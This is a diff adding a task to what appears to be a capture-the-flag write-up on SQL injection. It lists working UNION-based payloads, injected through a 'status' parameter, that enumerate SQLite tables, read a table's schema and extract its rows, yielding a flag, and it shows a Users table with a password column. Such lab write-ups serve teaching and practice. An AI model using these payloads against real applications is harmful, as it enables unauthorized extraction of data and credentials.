@@ -9,3 +9,16 @@
 **Payload (tables):**
 `status=Nobody' UNION SELECT group_concat(name),2,3,4,5 FROM sqlite_master WHERE type='table' -- -`
 **Result:** Orders, RandomTable1-10, not_me, Users
+
+## Task 2 - Data Exfiltration from not_me table
+
+**Payload (find columns):**
+`status=Nobody' UNION SELECT sql,2,3,4,5 FROM sqlite_master WHERE name='not_me' -- -`
+**Result:** CREATE TABLE not_me (id INTEGER, value TEXT, name TEXT)
+
+**Payload (extract data):**
+`status=Nobody' UNION SELECT group_concat(id||'|'||name||'|'||value),2,3,4,5 FROM not_me -- -`
+**Result:** 0|FLAG|851a30d168cd6f8ff774dc4b6c720066
+
+**Bonus - Users table structure:**
+CREATE TABLE Users (id INTEGER PRIMARY KEY, name VARCHAR(120), username VARCHAR(120) UNIQUE, password TEXT)
